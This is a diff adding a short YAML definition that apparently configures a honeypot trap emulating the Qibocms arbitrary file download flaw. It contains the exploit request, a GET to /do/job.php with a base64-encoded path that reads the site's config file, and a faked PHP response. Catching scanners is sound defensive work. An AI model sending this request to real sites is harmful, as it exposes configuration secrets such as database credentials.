@@ -1,0 +1,20 @@
+id: qibocms-file-download
+info:
+  name: Qibocms - Arbitrary File Download
+  author: theabhinavgaur
+  description: Qibocms is vulnerable to arbitrary file download vulnerability.
+  severity: high
+  metadata:
+    verified: true
+    max-request: 1
+  tags: qibocms,lfr
+traps:
+- request:
+    method: GET
+    path: /do/job.php?job=download&url=ZGF0YS9jb25maWcucGg8
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: <?php$webdb
